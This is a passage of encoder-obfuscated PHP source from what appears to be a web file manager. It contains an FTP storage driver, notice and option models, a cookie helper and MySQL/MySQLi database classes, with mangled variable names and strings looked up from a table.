($÷·ÆÅÖš) { return $üúàÁ‰Ù; } $üúàÁ‰Ù[$ëã— ©©[193]] = $üúàÁ‰Ù[$ëã— ©©[86]] = 0; $üúàÁ‰Ù[$ëã— ©©[194]] = $üúàÁ‰Ù[$ëã— ©©[195]] = !0; $¤ŞŞ´ÌŒ = $this->iconvSystem($ïŞ÷ïÖ); $üúàÁ‰Ù[$ëã— ©©[86]] = @ftp_mdtm($this->connect, $¤ŞŞ´ÌŒ); if (empty($‚”©†âà)) { $‚”©†âà = $this->objectMeta($ïŞ÷ïÖ); if (!$‚”©†âà) { return $üúàÁ‰Ù; } } $üúàÁ‰Ù[$ëã— ©©[80]] = $‚”©†âà[$ëã— ©©[80]]; return $üúàÁ‰Ù; } public function size($’ÓÈÎƒ) { $ÑÇİØ€ù = $this->objectMeta($’ÓÈÎƒ); return $ÑÇİØ€ù ? $ÑÇİØ€ù[$_SERVER[Ãìšã«™][80]] : 0; } public function info($Üú‡Şò…) { if ($this->isFile($Üú‡Şò…)) { return $this->fileInfo($Üú‡Şò…, 0); } else { if ($this->isFolder($Üú‡Şò…)) { return $this->folderInfo($Üú‡Şò…); } } return !1; } private function fileList($ØÍ¯ï¥á, &$äãœŠÅ¯, &$—íùû¬Æ, $®¸¼š¸ = false) { $¡ùÜ¤¦‘ =& $_SERVER[Ãìšã«™]; $ØÍ¯ï¥á = $this->iconvSystem($ØÍ¯ï¥á); if (!$this->isFolder($ØÍ¯ï¥á)) { return !1; } @ftp_chdir($this->connect, $¡ùÜ¤¦‘[8]); $ØÍ¯ï¥á = rtrim($ØÍ¯ï¥á, $¡ùÜ¤¦‘[8]) . $¡ùÜ¤¦‘[8]; check_abort(); $¤‡Ş“± = $this->listItemCache === !1 ? !1 : !0; $éµÚ•Ø = @ftp_rawlist($this->connect, $ØÍ¯ï¥á); if (!$éµÚ•Ø) { $éµÚ•Ø = array(); } $Â©ğ¹ÍÊ = array($¡ùÜ¤¦‘[10] => 1, $¡ùÜ¤¦‘[1368] => 1); foreach ($éµÚ•Ø as $±¯³µÎÆ) { $ƒ‹ÖÃìŒ = $this->_listItem($±¯³µÎÆ); if ($ƒ‹ÖÃìŒ[0] == $¡ùÜ¤¦‘[760]) { continue; } $å±¨‚„À = $ƒ‹ÖÃìŒ[8]; if (empty($å±¨‚„À) && $å±¨‚„À !== $¡ùÜ¤¦‘[190] || isset($Â©ğ¹ÍÊ[$å±¨‚„À])) { continue; } $å±¨‚„À = $this->iconvApp($ØÍ¯ï¥á . ltrim($å±¨‚„À, $¡ùÜ¤¦‘[8])); $àèâ½æ = array($¡ùÜ¤¦‘[32] => $å±¨‚„À, $¡ùÜ¤¦‘[33] => $¡ùÜ¤¦‘[192], $¡ùÜ¤¦‘[80] => $ƒ‹ÖÃìŒ[4]); if (substr($±¯³µÎÆ, 0, 1) == $¡ùÜ¤¦‘[1369]) { $àèâ½æ[$¡ùÜ¤¦‘[33]] = $¡ùÜ¤¦‘[79]; $àèâ½æ[$¡ùÜ¤¦‘[80]] = 0; } $ã«ˆÍ·ˆ = $àèâ½æ[$¡ùÜ¤¦‘[33]] == $¡ùÜ¤¦‘[79] ? !0 : !1; if ($¤‡Ş“±) { $this->cacheMethod($¡ùÜ¤¦‘[198], $å±¨‚„À, $ã«ˆÍ·ˆ); $this->cacheMethod($¡ùÜ¤¦‘[199], $å±¨‚„À, $àèâ½æ); } if ($ã«ˆÍ·ˆ) { $äãœŠÅ¯[] = $å±¨‚„À; if ($®¸¼š¸) { $this->fileList($å±¨‚„À, $äãœŠÅ¯, $—íùû¬Æ, $®¸¼š¸); } continue; } $—íùû¬Æ[] = $àèâ½æ; } if ($¤‡Ş“±) { $this->cacheMethod($¡ùÜ¤¦‘[198], $ØÍ¯ï¥á, !0); } } private function _listItem($ÙÏ¢Ó¸ê) { if (empty($ÙÏ¢Ó¸ê)) { return array(); } $ÏûáÁüÀ = preg_split($_SERVER[Ãìšã«™][1370], $ÙÏ¢Ó¸ê); if (count($ÏûáÁüÀ) <= 9) { return $ÏûáÁüÀ; } $ÏûáÁüÀ[8] = trim(substr($ÙÏ¢Ó¸ê, strpos($ÙÏ¢Ó¸ê, $ÏûáÁüÀ[7]) + strlen($ÏûáÁüÀ[7]))); return array_splice($ÏûáÁüÀ, 0, 9); } public function listPath($µŞÀ©Óİ, $Ø¬—ÜÎ = false) { $óõÄ­£Ù =& $_SERVER[Ãìšã«™]; if (!$this->_isconn()) { return !1; } $ğößåÌ = $úÅü­Ü = array(); $this->fileList($µŞÀ©Óİ, $ğößåÌ, $úÅü­Ü); foreach ($ğößåÌ as $ïüÀ™é => $«å“†£Ç) { $ğößåÌ[$ïüÀ™é] = $this->folderInfo($«å“†£Ç, $Ø¬—ÜÎ); } foreach ($úÅü­Ü as $ïüÀ™é => $«å“†£Ç) { $úÅü­Ü[$ïüÀ™é] = $this->fileInfo($«å“†£Ç[$óõÄ­£Ù[32]], $Ø¬—ÜÎ, $«å“†£Ç); } return array($óõÄ­£Ù[77] => $ğößåÌ, $óõÄ­£Ù[76] => $úÅü­Ü); } public function has($Ë…ÙÚ«Ò, $¿—­é…Ï = false, $°´°Šı¾ = true) { $ÙÓğ‘ë =& $_SERVER[Ãìšã«™]; $º´¦ßÜ– = $Ôú»‰ü = array(); $Õºí›æğ = $¿—­é…Ï ? !0 : !1; $this->fileList($Ë…ÙÚ«Ò, $º´¦ßÜ–, $Ôú»‰ü, $Õºí›æğ); if ($¿—­é…Ï) { return array($ÙÓğ‘ë[202] => count($Ôú»‰ü), $ÙÓğ‘ë[203] => count($º´¦ßÜ–)); } if ($°´°Šı¾) { if (count($Ôú»‰ü)) { return !0; } } else { if (count($º´¦ßÜ–)) { return !0; } } return !1; } public function listAll($ÕËíÃæ) { $şƒÃÕ–š =& $_SERVER[Ãìšã«™]; if (!$this->_isconn()) { return !1; } $¸‡§÷šˆ = $¢å‹ğÃ = array(); $this->fileList($ÕËíÃæ, $¸‡§÷šˆ, $¢å‹ğÃ, !0); $æœ‹Èµá = array(); foreach ($¢å‹ğÃ as $œ—ªâĞ‡) { $æœ‹Èµá[$œ—ªâĞ‡[$şƒÃÕ–š[32]]] = $œ—ªâĞ‡[$şƒÃÕ–š[80]]; } foreach ($¸‡§÷šˆ as $œ—ªâĞ‡) { if (is_string($œ—ªâĞ‡)) { $æœ‹Èµá[$œ—ªâĞ‡] = 0; } } return $this->listAllFiles($ÕËíÃæ, array_keys($æœ‹Èµá), $æœ‹Èµá); } public function getContent($àì­×Ú) { if (!$this->_isconn()) { return !1; } $àì­×Ú = $this->iconvSystem($àì­×Ú); return $this->fileSubstr($àì­×Ú); } public function setContent($ıîÓ‹øÕ, $ê½™¸æ = '') { if (!$this->_isconn()) { return !1; } $‡·—Ä•Ã = $this->pathThis($this->iconvSystem($ıîÓ‹øÕ)); $âÕÈŸ†Á = $this->tempFile($‡·—Ä•Ã); file_put_contents($âÕÈŸ†Á, $ê½™¸æ); $™™£ûì = $this->upload($ıîÓ‹øÕ, $this->iconvApp($âÕÈŸ†Á)); $this->tempFileRemve($âÕÈŸ†Á); return $™™£ûì; } public function fileSubstr($‹—Š‚»Ş, $ÈÇÇãÕµ = 0, $ô€ ÆÃÜ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($‹—Š‚»Ş, $ÈÇÇãÕµ, $ô€ ÆÃÜ); } private function ftpRequest($ŒäÎ˜¤ı, $ïÀ˜¦Ñ¬ = 0, $ûåª¯¼ = false) { $ŒäÎ˜¤ı = $this->iconvSystem($ŒäÎ˜¤ı); $ê–ù³ºò = $this->scheme . $this->host . $_SERVER[Ãìšã«™][4] . $this->port; $ËÁËÍáà = curl_init(); curl_setopt($ËÁËÍáà, CURLOPT_URL, $ê–ù³ºò . $this->pathEncode($ŒäÎ˜¤ı)); curl_setopt($ËÁËÍáà, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ûåª¯¼) { $ÑË­¹ = $ïÀ˜¦Ñ¬ + $ûåª¯¼ - 1; curl_setopt($ËÁËÍáà, CURLOPT_RANGE, "{$ïÀ˜¦Ñ¬}\55{$ÑË­¹}"); } curl_setopt($ËÁËÍáà, CURLOPT_RETURNTRANSFER, 1); $úŒáÙ¥¢ = curl_exec($ËÁËÍáà); curl_close($ËÁËÍáà); return $úŒáÙ¥¢; } public function upload($ª—ùºª, $×êÕÎÑ×, $Áœú“ÔŸ = false, $«²ÅÍŠ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ª—ùºª))) { return !1; } $ª—ùºª = $this->iconvSystem($ª—ùºª); $×êÕÎÑ× = $this->iconvSystem($×êÕÎÑ×); $ÃÆ ì»˜ = ftp_nb_put($this->connect, $ª—ùºª, $×êÕÎÑ×, FTP_BINARY); while ($ÃÆ ì»˜ == FTP_MOREDATA) { $ÃÆ ì»˜ = ftp_nb_continue($this->connect); } if ($ÃÆ ì»˜ != FTP_FINISHED) { return !1; } return $this->getPathOuter($ª—ùºª); } public function download($È‰†Á˜³, $¤Âù¨¤Î = '') { if (!$this->_isconn()) { return !1; } $ï§‡›”‰ = $this->pathFather($¤Âù¨¤Î); if (!IO::mkdir($ï§‡›”‰)) { return !1; } $È‰†Á˜³ = $this->iconvSystem($È‰†Á˜³); $¤Âù¨¤Î = $this->iconvSystem($¤Âù¨¤Î); $§”çÇõß = ftp_nb_get($this->connect, $¤Âù¨¤Î, $È‰†Á˜³, FTP_BINARY); while ($§”çÇõß == FTP_MOREDATA) { $§”çÇõß = ftp_nb_continue($this->connect); } if ($§”çÇõß != FTP_FINISHED) { return !1; } return $this->iconvApp($¤Âù¨¤Î); } public function exist($†®‰§Ù) { return $this->isFile($†®‰§Ù) || $this->isFolder($†®‰§Ù); } public function isFile($ŸÚÌä‹ù) { return !$this->isFolder($ŸÚÌä‹ù) && $this->objectMeta($ŸÚÌä‹ù); } public function isFolder($š‡ö‘òÁ) { return $this->cacheMethod($_SERVER[Ãìšã«™][198], $š‡ö‘òÁ); } protected function objectMeta($Ûû‹ŞĞ½) { return $this->cacheMethod($_SERVER[Ãìšã«™][199], $Ûû‹ŞĞ½); } protected function _objectMeta($ÎŸªÕîô) { $ÑÄüöÚ =& $_SERVER[Ãìšã«™]; if ($ÎŸªÕîô == $ÑÄüöÚ[12] || $ÎŸªÕîô == $ÑÄüöÚ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ÎŸªÕîô = $this->iconvSystem($ÎŸªÕîô); $¤¹á›¯ı = array($ÑÄüöÚ[32] => $this->iconvApp($ÎŸªÕîô), $ÑÄüöÚ[33] => $ÑÄüöÚ[192], $ÑÄüöÚ[80] => 0); @ftp_chdir($this->connect, $ÑÄüöÚ[8]); $­Ü’‡“± = @ftp_size($this->connect, $ÎŸªÕîô); if ($­Ü’‡“± != -1) { $¤¹á›¯ı[$ÑÄüöÚ[80]] = $­Ü’‡“±; } else { $–¿ø–±ø = @ftp_chdir($this->connect, $ÎŸªÕîô); if (!$–¿ø–±ø) { return !1; } $¤¹á›¯ı[$ÑÄüöÚ[33]] = $ÑÄüöÚ[79]; } return $¤¹á›¯ı; } protected function _isFolder($ÀÂÀÅŸ) { $Š¢ÖÓŠ =& $_SERVER[Ãìšã«™]; if ($ÀÂÀÅŸ == $Š¢ÖÓŠ[12] || $ÀÂÀÅŸ == $Š¢ÖÓŠ[8]) { return !0; } $ª·Ôæüİ = $this->_objectMeta($ÀÂÀÅŸ); return isset($ª·Ôæüİ[$Š¢ÖÓŠ[33]]) && $ª·Ôæüİ[$Š¢ÖÓŠ[33]] == $Š¢ÖÓŠ[79] ? !0 : !1; } } goto Eèõ¶èË™¢; cæ³¦‰…·Ì: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\x2e\156\x6f\164\151\x63\x65\x4c\151\x73\x74"; public $field = array("\x6e\x61\155\145", "\143\157\156\164\x65\156\x74", "\141\x75\164\150", "\x6d\157\x64\x65", "\x74\151\x6d\145", "\164\x79\160\145", "\x6c\145\x76\x65\x6c", "\x65\x6e\x61\142\x6c\x65", "\x73\x6f\162\x74"); public function listData($ÏĞçª’¼ = false, $¥¥ÄÅñ· = "\x73\x6f\x72\x74", $‹÷–¨® = false) { return parent::listData($ÏĞçª’¼, $¥¥ÄÅñ·, $‹÷–¨®); } public function add($À¦„¥Ãô) { $Û…âÚ’ê =& $_SERVER[Ãìšã«™]; $¬ó¦öıœ = time(); if ($À¦„¥Ãô[$Û…âÚ’ê[16]] == $Û…âÚ’ê[2231]) { $¬ó¦öıœ = strtotime($À¦„¥Ãô[$Û…âÚ’ê[196]]); } $À¦„¥Ãô[$Û…âÚ’ê[196]] = $¬ó¦öıœ; return parent::insert($À¦„¥Ãô); } public function update($¬ÙÆáÓú, $¤Ë¿Çê) { $”ßç‹Úˆ =& $_SERVER[Ãìšã«™]; $çÜä€¾ = $this->listData($¬ÙÆáÓú); if (!$çÜä€¾) { return !1; } $Ù’åúß¥ = time(); if ($¤Ë¿Çê[$”ßç‹Úˆ[16]] == $”ßç‹Úˆ[2231]) { $Ù’åúß¥ = strtotime($¤Ë¿Çê[$”ßç‹Úˆ[196]]); } $¤Ë¿Çê[$”ßç‹Úˆ[196]] = $Ù’åúß¥; return parent::update($¬ÙÆáÓú, $¤Ë¿Çê); } public function remove($›ÈŸÁÌÛ) { $Öğº–÷İ = $this->listData($›ÈŸÁÌÛ); if (!$Öğº–÷İ || $Öğº–÷İ[$_SERVER[Ãìšã«™][1270]]) { return !1; } return parent::remove($›ÈŸÁÌÛ); } public function sort($Ó£šœ­, $©½¯÷…“) { return parent::update($Ó£šœ­, $©½¯÷…“); } public function enable($ÕÒü¼…, $Å¡ïà¤µ) { return parent::update($ÕÒü¼…, array($_SERVER[Ãìšã«™][2232] => $Å¡ïà¤µ)); } private function initUserOption() { $ßåöŒÈ =& $_SERVER[Ãìšã«™]; $this->optionType = $ßåöŒÈ[2233]; $this->modelType = $ßåöŒÈ[2234]; $this->field = array($ßåöŒÈ[2235], $ßåöŒÈ[32], $ßåöŒÈ[196], $ßåöŒÈ[33], $ßåöŒÈ[2236], $ßåöŒÈ[751], $ßåöŒÈ[188]); } public function userNoticeGet($À‰»š¥• = false) { $this->initUserOption(); return parent::listData($À‰»š¥•, $_SERVER[Ãìšã«™][392], !0); } public function userNoticeAdd($èñù•œ†) { $ğ€ê¼¬· =& $_SERVER[Ãìšã«™]; $this->initUserOption(); $á Öãä— = $this->findByKey($ğ€ê¼¬·[2235], $èñù•œ†[$ğ€ê¼¬·[392]]); if ($á Öãä—) { return !0; } $ğ¹öî° = array($ğ€ê¼¬·[2235] => $èñù•œ†[$ğ€ê¼¬·[392]], $ğ€ê¼¬·[32] => $èñù•œ†[$ğ€ê¼¬·[32]], $ğ€ê¼¬·[196] => $èñù•œ†[$ğ€ê¼¬·[196]], $ğ€ê¼¬·[33] => isset($èñù•œ†[$ğ€ê¼¬·[33]]) ? $èñù•œ†[$ğ€ê¼¬·[33]] : 1, $ğ€ê¼¬·[2236] => isset($èñù•œ†[$ğ€ê¼¬·[2236]]) ? $èñù•œ†[$ğ€ê¼¬·[2236]] : 0, $ğ€ê¼¬·[751] => 0, $ğ€ê¼¬·[188] => 0); return parent::insert($ğ¹öî°); } public function userNoticeEdit($Äø®ºş, $¾Šî¯—ë) { $this->initUserOption(); return parent::update($Äø®ºş, $¾Šî¯—ë); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\164\145\155\137\x6f\x70\164\151\157\x6e"; protected $jsonField = array("\155\145\156\165", "\x72\157\154\145", "\x72\x6f\x6c\x65\x47\162\x6f\x75\160", "\x72\145\x67\151\163\x74", "\x65\x6d\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($£È¼ˆ€š) { return "\123\171\x73\164\145\x6d\x4f\x70\164\151\157\x6e\137{$£È¼ˆ€š}"; } protected function optionDefault($¡¾Ú£Í½ = '') { $·ÆÅŠÕ =& $_SERVER[Ãìšã«™]; if ($¡¾Ú£Í½ == $·ÆÅŠÕ[12]) { return $GLOBALS[$·ÆÅŠÕ[6]][$·ÆÅŠÕ[376]]; } } } class SystemRecordModel extends ModelBaseLight { } goto CÑ¢ÍÙ°ÍÚ; B…øÁĞ¨ô: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($¥Ë¨Îƒ = '', $±ìÚ÷ù» = 0) { if (is_string($¥Ë¨Îƒ) && $¥Ë¨Îƒ != $_SERVER[Ãìšã«™][12]) { $this->prefix = $¥Ë¨Îƒ; } if (is_numeric($±ìÚ÷ù») && $±ìÚ÷ù» > 0) { $this->expire = $±ìÚ÷ù»; } } public static function getInstance() { static $ÏÅªçÃ; if ($ÏÅªçÃ === null) { $ÏÅªçÃ = new self(); } return $ÏÅªçÃ; } private static $cookieDisable = false; public static function disable($ºÈüÅ€¨) { self::$cookieDisable = $ºÈüÅ€¨; } private static $sameCookieSet = array(); public static function set($Ÿ¤ãÖÜÈ, $ÛßÀƒ˜í, $ ³˜—àÔ = 0, $î•ÜŞªí = false, $×ëÂıÏ = false) { $Š¢éã• =& $_SERVER[Ãìšã«™]; if (self::$cookieDisable) { return; } if (!$ ³˜—àÔ) { $ ³˜—àÔ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Ÿ¤ãÖÜÈ]) && self::$sameCookieSet[$Ÿ¤ãÖÜÈ] == $ÛßÀƒ˜í . $ ³˜—àÔ) { return; } self::$sameCookieSet[$Ÿ¤ãÖÜÈ] = $ÛßÀƒ˜í . $ ³˜—àÔ; if (!$×ëÂıÏ) { $×ëÂıÏ = str_replace(HOST, $Š¢éã•[12], APP_HOST); $×ëÂıÏ = _get($GLOBALS, $Š¢éã•[878], $×ëÂıÏ); } $óş˜åç¼ = $Š¢éã•[12]; setcookie($Ÿ¤ãÖÜÈ, $ÛßÀƒ˜í, time() + $ ³˜—àÔ, $Š¢éã•[8] . trim($×ëÂıÏ, $Š¢éã•[8]) . $óş˜åç¼, !1, !1, $î•ÜŞªí); } public static function setSafe($ÂÖçÓÎû, $¡¤Üã¨ú, $†ŸÛÑá€ = 0) { self::set($ÂÖçÓÎû, $¡¤Üã¨ú, $†ŸÛÑá€, !0); } public static function get($¥¸Úï–ï) { static $äîç™÷õ = false; if (!$äîç™÷õ) { self::initHeaderCookie(); $äîç™÷õ = !0; } return isset($_COOKIE[$¥¸Úï–ï]) ? $_COOKIE[$¥¸Úï–ï] : !1; } private static function initHeaderCookie() { $•ìçªı =& $_SERVER[Ãìšã«™]; if (!isset($_SERVER[$•ìçªı[879]]) || !$_SERVER[$•ìçªı[879]]) { return; } $–â­Ì¾Ú = explode($•ìçªı[71], $_SERVER[$•ìçªı[879]]); foreach ($–â­Ì¾Ú as $ÆÆæ¸İ) { $ÆÆæ¸İ = explode($•ìçªı[880], $ÆÆæ¸İ); if (count($ÆÆæ¸İ) != 2 || !isset($ÆÆæ¸İ[1])) { continue; } $_COOKIE[trim($ÆÆæ¸İ[0])] = trim($ÆÆæ¸İ[1]); } } public static function remove($’áéœ°õ, $ ´Ù ˜¨ = false) { unset($_COOKIE[$’áéœ°õ]); self::set($’áéœ°õ, $_SERVER[Ãìšã«™][12], 1, $ ´Ù ˜¨); } } class DbMysql extends Db { public function __construct($ÑøÈ¿Éæ = '') { $„÷Áº½ =& $_SERVER[Ãìšã«™]; if (!extension_loaded($„÷Áº½[805])) { think_exception(think_lang($„÷Áº½[14]) . $„÷Áº½[881]); } if (!empty($ÑøÈ¿Éæ)) { $this->config = $ÑøÈ¿Éæ; if (empty($this->config[$„÷Áº½[17]])) { $this->config[$„÷Áº½[17]] = $„÷Áº½[12]; } } } public function connect($’şñÛùÀ = '', $„Õ¾ùú = 0, $•ÌÃ¥ë× = false) { $äÕ­¤½¦ =& $_SERVER[Ãìšã«™]; if (!isset($this->linkID[$„Õ¾ùú])) { if (empty($’şñÛùÀ)) { $’şñÛùÀ = $this->config; } $“ÍŒÈ­ = $’şñÛùÀ[$äÕ­¤½¦[882]] . ($’şñÛùÀ[$äÕ­¤½¦[883]] ? "\x3a{$’şñÛùÀ[$äÕ­¤½¦[883]]}" : $äÕ­¤½¦[12]); $»ºÍß²£ = !empty($’şñÛùÀ[$äÕ­¤½¦[17]][$äÕ­¤½¦[18]]) ? $’şñÛùÀ[$äÕ­¤½¦[17]][$äÕ­¤½¦[18]] : $this->pconnect; if ($»ºÍß²£) { $this->linkID[$„Õ¾ùú] = mysql_pconnect($“ÍŒÈ­, $’şñÛùÀ[$äÕ­¤½¦[884]], $’şñÛùÀ[$äÕ­¤½¦[885]], 131072); } else { $this->linkID[$„Õ¾ùú] = mysql_connect($“ÍŒÈ­, $’şñÛùÀ[$äÕ­¤½¦[884]], $’şñÛùÀ[$äÕ­¤½¦[885]], !0, 131072); } if (!$this->linkID[$„Õ¾ùú] || !empty($’şñÛùÀ[$äÕ­¤½¦[21]]) && !mysql_select_db($’şñÛùÀ[$äÕ­¤½¦[21]], $this->linkID[$„Õ¾ùú])) { think_exception(mysql_error()); } $°°ğİÖ« = mysql_get_server_info($this->linkID[$„Õ¾ùú]); mysql_query($äÕ­¤½¦[886] . think_config($äÕ­¤½¦[887]) . $äÕ­¤½¦[58], $this->linkID[$„Õ¾ùú]); if ($°°ğİÖ« > $äÕ­¤½¦[888]) { mysql_query($äÕ­¤½¦[889], $this->linkID[$„Õ¾ùú]); } $this->connected = !0; if (1 != think_config($äÕ­¤½¦[22])) { unset($this->config); } } return $this->linkID[$„Õ¾ùú]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Ë”«½º™) { $°ĞòÑ´Ä =& $_SERVER[Ãìšã«™]; if (0 === stripos($Ë”«½º™, $°ĞòÑ´Ä[259])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ë”«½º™; if ($this->queryID) { $this->free(); } think_action_status($°ĞòÑ´Ä[23], 1); think_status($°ĞòÑ´Ä[24]); $this->queryID = mysql_query($Ë”«½º™, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ß÷Ì†³) { $ä·â•âÆ =& $_SERVER[Ãìšã«™]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ß÷Ì†³; if ($this->queryID) { $this->free(); } think_action_status($ä·â•âÆ[25], 1); think_status($ä·â•âÆ[24]); $ŠÏ«É¬ä = mysql_query($ß÷Ì†³, $this->_linkID); $this->debug(); if (!1 === $ŠÏ«É¬ä) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ãìšã«™][890], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÙØ€©Æ¢ = mysql_query($_SERVER[Ãìšã«™][891], $this->_linkID); $this->transTimes = 0; if (!$ÙØ€©Æ¢) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ì¨ÃÎŞÖ = mysql_query($_SERVER[Ãìšã«™][892], $this->_linkID); $this->transTimes = 0; if (!$Ì¨ÃÎŞÖ) { $this->error(); return !1; } } return !0; } private function getAll() { $ª»ûşÍÉ = array(); if ($this->numRows > 0) { while ($×ÅÛº’¼ = mysql_fetch_assoc($this->queryID)) { $ª»ûşÍÉ[] = $×ÅÛº’¼; } mysql_data_seek($this->queryID, 0); } return $ª»ûşÍÉ; } public function getFields($¸·„Àâõ) { $ÄåÃ‘ ñ =& $_SERVER[Ãìšã«™]; $ñ–®Ë¾ = $this->query($ÄåÃ‘ ñ[893] . $this->parseKey($¸·„Àâõ)); $¹Ï¹Œ¢¸ = array(); if ($ñ–®Ë¾) { foreach ($ñ–®Ë¾ as $ÈóŸ¶ì½ => $³‚Ò°¡ë) { $¹Ï¹Œ¢¸[$³‚Ò°¡ë[$ÄåÃ‘ ñ[31]]] = array($ÄåÃ‘ ñ[32] => $³‚Ò°¡ë[$ÄåÃ‘ ñ[31]], $ÄåÃ‘ ñ[33] => $³‚Ò°¡ë[$ÄåÃ‘ ñ[34]], $ÄåÃ‘ ñ[35] => (bool) (strtoupper($³‚Ò°¡ë[$ÄåÃ‘ ñ[36]]) === $ÄåÃ‘ ñ[894]), $ÄåÃ‘ ñ[37] => $³‚Ò°¡ë[$ÄåÃ‘ ñ[38]], $ÄåÃ‘ ñ[39] => strtolower($³‚Ò°¡ë[$ÄåÃ‘ ñ[40]]) == $ÄåÃ‘ ñ[41], $ÄåÃ‘ ñ[42] => strtolower($³‚Ò°¡ë[$ÄåÃ‘ ñ[43]]) == $ÄåÃ‘ ñ[44]); } } return $¹Ï¹Œ¢¸; } public function getTables($ËªÛç = '') { $†ÁŸŠÂ™ =& $_SERVER[Ãìšã«™]; if (!empty($ËªÛç)) { $¾”•ù = $†ÁŸŠÂ™[895] . $ËªÛç . $†ÁŸŠÂ™[896]; } else { $¾”•ù = $†ÁŸŠÂ™[897]; } $Ùİ•îÄ = $this->query($¾”•ù); $ãÏ’ŸŠ = array(); foreach ($Ùİ•îÄ as $Ğïßü§ä => $æ»” ìÒ) { $ãÏ’ŸŠ[$Ğïßü§ä] = current($æ»” ìÒ); } return $ãÏ’ŸŠ; } public function replace($¬”±Ã£, $ÀÒÍí¦ = array()) { $â´å™Çü =& $_SERVER[Ãìšã«™]; foreach ($¬”±Ã£ as $¥îõş¡ˆ => $Çõ§©é) { $ŠØîñó = $this->parseValue($Çõ§©é); if (is_scalar($ŠØîñó)) { $ÕĞ…Éºå[] = $ŠØîñó; $àöÚòåá[] = $this->parseKey($¥îõş¡ˆ); } } $±ğó¯ï = $â´å™Çü[898] . $this->parseTable($ÀÒÍí¦[$â´å™Çü[274]]) . $â´å™Çü[899] . implode($â´å™Çü[50], $àöÚòåá) . $â´å™Çü[900] . implode($â´å™Çü[50], $ÕĞ…Éºå) . $â´å™Çü[901]; return $this->execute($±ğó¯ï); } public function insertAll($ô”ƒ—ßğ, $ğ›¥÷Î = array(), $ÍÇ›üõ = false) { $Šº¿Æò =& $_SERVER[Ãìšã«™]; if (!is_array($ô”ƒ—ßğ[0])) { return !1; } $ûåÒëê = array_keys($ô”ƒ—ßğ[0]); $ÀØÑÛ›Ô = array(); foreach ($ô”ƒ—ßğ as $ôøİı»ê) { $Ç¢—“òÇ = array(); foreach ($ôøİı»ê as $ÓÀ‘øÆ® => $±¹Úè¥) { $±¹Úè¥ = $this->parseValue($±¹Úè¥); if (is_scalar($±¹Úè¥)) { $Ç¢—“òÇ[] = $±¹Úè¥; } } $ÀØÑÛ›Ô[] = $Šº¿Æò[255] . implode($Šº¿Æò[50], $Ç¢—“òÇ) . $Šº¿Æò[901]; } array_walk($ûåÒëê, array($this, $Šº¿Æò[902])); $’°™ì±É = ($ÍÇ›üõ ? $Šº¿Æò[903] : $Šº¿Æò[904]) . $Šº¿Æò[905] . $this->parseTable($ğ›¥÷Î[$Šº¿Æò[274]]) . $Šº¿Æò[899] . implode($Šº¿Æò[50], $ûåÒëê) . $Šº¿Æò[906] . implode($Šº¿Æò[50], $ÀØÑÛ›Ô); return $this->execute($’°™ì±É); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $‚‚ª¦° =& $_SERVER[Ãìšã«™]; $this->error = mysql_errno() . $‚‚ª¦°[4] . mysql_error($this->_linkID); if ($‚‚ª¦°[12] != $this->queryStr) { $this->error .= LNG($‚‚ª¦°[48]) . $this->queryStr; } think_trace($this->error, $‚‚ª¦°[12], $‚‚ª¦°[49]); return $this->error; } public function escapeString($Ê Æ ®×) { if ($this->_linkID) { return mysql_real_escape_string($Ê Æ ®×, $this->_linkID); } else { return mysql_escape_string($Ê Æ ®×); } } public function parseKey(&$¶„¡Ë’, $æÃ¾Ù²Œ = true) { $ÊÕ Æø¶ =& $_SERVER[Ãìšã«™]; if ($æÃ¾Ù²Œ) { $¶„¡Ë’ = $this->parseKeyCheck($¶„¡Ë’); } if ($¶„¡Ë’ != $ÊÕ Æø¶[181] && !preg_match($ÊÕ Æø¶[907], $¶„¡Ë’)) { $¶„¡Ë’ = $ÊÕ Æø¶[380] . trim($¶„¡Ë’, $ÊÕ Æø¶[380]) . $ÊÕ Æø¶[380]; } return $¶„¡Ë’; } } class DbMysqli extends Db { public function __construct($ ïÊòå = '') { $£ÄØÇÓ– =& $_SERVER[Ãìšã«™]; if (!extension_loaded($£ÄØÇÓ–[908])) { think_exception(think_lang($£ÄØÇÓ–[14]) . $£ÄØÇÓ–[909]); } if (!empty($ ïÊòå)) { $this->config = $ ïÊòå; if (empty($this->config[$£ÄØÇÓ–[17]])) { $this->config[$£ÄØÇÓ–[17]] = $£ÄØÇÓ–[12]; } } } public function connect($¬­“ÏˆŞ = '', $—ãÛßş = 0) { $ã‰ø¢ïŞ =& $_SERVER[Ãìšã«™]; if (!isset($this->linkID[$—ãÛßş])) { if (empty($¬­“ÏˆŞ)) { $¬­“ÏˆŞ = $this->config; } $this->linkID[$—ãÛßş] = new mysqli($¬­“ÏˆŞ[$ã‰ø¢ïŞ[882]], $¬­“ÏˆŞ[$ã‰ø¢ïŞ[884]], $¬­“ÏˆŞ[$ã‰ø¢ïŞ[885]], $¬­“ÏˆŞ[$ã‰ø¢ïŞ[21]], $¬­“ÏˆŞ[$ã‰ø¢ïŞ[883]] ? intval($¬­“ÏˆŞ[$ã‰ø¢ïŞ[883]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $Ù„ûªáù = 